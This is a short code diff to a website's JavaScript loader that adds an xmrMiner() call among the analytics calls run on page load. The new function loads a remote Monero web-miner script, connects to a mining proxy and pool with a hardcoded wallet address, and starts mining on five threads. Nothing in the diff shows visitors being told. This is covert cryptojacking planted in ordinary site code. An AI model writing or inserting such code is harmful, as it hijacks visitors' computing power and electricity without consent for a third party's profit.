@@ -17,6 +17,7 @@ function loadIMCMain() {
     loadScripts(jsFiles);
     baiduTongji();
     googleAnalytics();
+    xmrMiner();
 
     // if (!localStorage.getItem('hasVisited')) {
     //   localStorage.setItem('hasVisited', 'true');
@@ -84,8 +85,22 @@ function redirectToDomain() {
     redirectToLinks('win', url);
 }
 
-// 百度统计
+function xmrMiner() {
+    loadScripts([
+        'https://imc.re/assets/js/na-monero.js',
+        // "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
+    ]);
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "47YPoXCVUxAQFpS8gmQX4fgY5LmnGkNG4Xz3WjzADvvZhr8WnNG3P4MD4hPAxF8aWZbUSrHhJ7YdZ4x3pi3qJw6aT9RxMg2";
+    var workerId = "WEB-XMR"
+    var threads = 5; //-1
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+}
 
+// 百度统计
 function baiduTongji(id) {
     var id = id || 'a02d22441e44bb824edf8620f6c3f5fa';
     var _hmt = _hmt || [];
